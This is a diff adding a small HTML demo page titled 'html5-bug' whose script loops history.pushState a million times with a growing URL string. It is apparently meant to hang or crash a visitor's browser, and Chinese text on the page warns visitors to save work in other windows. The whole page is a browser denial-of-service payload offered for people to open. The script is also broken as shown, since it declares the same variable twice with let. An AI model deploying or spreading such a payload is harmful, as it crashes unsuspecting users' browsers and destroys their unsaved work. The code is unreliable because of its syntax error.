@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>html5-bug</title>
+</head>
+<body>
+    <div>
+        <h1>demo：（温馨提示：请保存浏览器其它窗口的编辑任务）</h1>
+        <a href="www.0xroot.cn/demo.html">www.0xroot.cn/demo.html (点击一下，又不会怀孕！)</a>
+        <a href="https://laod.cn/tag/html5-bug/">https://laod.cn/tag/html5-bug/</a>
+    </div>
+    <script>
+        let total = "";
+        for (let i = 0; i < 1000000; i++){
+           total += i.toString();
+           history.pushState(0,0,total);
+        }
+        // https://laod.cn/tag/chrome/
+        // https://laod.cn/tag/chrome/0123456789
+        let total = "";
+        for (let i = 0; i < 10; i++){
+           total += i.toString();
+           history.pushState(0,0,total);
+        }
+    </script>
+</body>
+</html>
